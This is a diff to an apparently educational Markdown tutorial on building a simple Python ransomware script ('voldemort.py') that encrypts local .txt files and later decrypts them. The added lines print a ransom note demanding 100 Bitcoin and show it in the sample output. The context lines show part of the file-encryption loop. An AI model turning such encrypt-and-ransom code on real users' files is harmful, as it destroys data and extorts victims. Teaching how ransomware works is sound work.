@@ -188,6 +188,11 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
+print(
+    "UH OH!! All of your files have been encrypted! Send me 100 Bitcoin "
+    "or they will be gone in 24 hours FOREVER!!! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️"
+)
+
 ```
 </details>
 
@@ -208,7 +213,8 @@ Run ``voldemort.py`` and you should see the following output:
 
 <pre>
 <code>$ python voldemort.py
-['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
+['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
+UH OH!! All of your files have been encrypted! Send me 100 Bitcoin or they will be gone in 24 hours FOREVER!!! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️</code>
 </pre>
 
 This is the moment we've all been waiting for. Now all these ``.txt`` files have been left in ruins 😈:
@@ -232,7 +238,7 @@ uGb51hGWiq-3FEslUhjYNDn2HBWs8JXl-X1RHUqiiSw=%</code>
 </pre>
 
 **Step 5:**
-Now we can unlock all these files once and for all by writing a ``decrypt.py`` file. Luckily, it is already very similar to the ``voldemort.py`` (AKA encrypting) file:
+Now we can unlock all these files once and for all by writing a ``decrypt.py`` file. Luckily, it is already very similar to the ``voldemort.py`` (AKA the *encrypt.py* file):
 
 <pre>
 <code>$ cp voldemort.py decrypt.py
